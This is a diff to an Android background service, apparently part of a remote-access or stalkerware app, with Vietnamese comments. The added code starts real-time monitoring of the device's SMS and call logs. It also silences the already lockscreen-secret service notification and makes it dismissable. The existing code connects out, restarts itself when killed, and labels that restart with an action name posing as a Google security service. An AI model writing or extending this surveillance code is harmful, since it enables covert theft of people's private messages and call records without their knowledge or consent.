@@ -12,6 +12,7 @@ import android.os.Build;
 
 public class MainService extends Service {
     private static Context contextOfApplication;
+    private RealtimeMonitor realtimeMonitor;
 
     public MainService() {
     }
@@ -32,6 +33,14 @@ public class MainService extends Service {
         
         contextOfApplication = this;
         ConnectionManager.startAsync(this);
+        
+        // Bắt đầu theo dõi realtime SMS và Call Logs
+        if (realtimeMonitor == null) {
+            realtimeMonitor = new RealtimeMonitor(this);
+            realtimeMonitor.startMonitoring();
+            Log.d("MainService", "✅ Realtime monitoring started");
+        }
+        
         return Service.START_STICKY;
     }
 
@@ -43,6 +52,9 @@ public class MainService extends Service {
             android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN);
             channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
             channel.setShowBadge(false);
+            channel.setSound(null, null);
+            channel.enableLights(false);
+            channel.enableVibration(false);
             
             android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (manager != null) {
@@ -54,7 +66,7 @@ public class MainService extends Service {
                 }
 
                 android.app.Notification.Builder nb = new android.app.Notification.Builder(this, channelId)
-                    .setOngoing(true)
+                    .setOngoing(false)
                     .setSmallIcon(R.mipmap.ic_launcher)
                     .setContentTitle(getString(R.string.service_notification_title))
                     .setContentText(getString(R.string.service_notification_active))
@@ -109,6 +121,12 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
+        // Dừng realtime monitoring
+        if (realtimeMonitor != null) {
+            realtimeMonitor.stopMonitoring();
+            Log.d("MainService", "Realtime monitoring stopped");
+        }
+        
         // Attempt to restart if destroyed by system
         Intent broadcastIntent = new Intent();
         broadcastIntent.setAction("com.google.android.sys.security.RESTART_SERVICE");
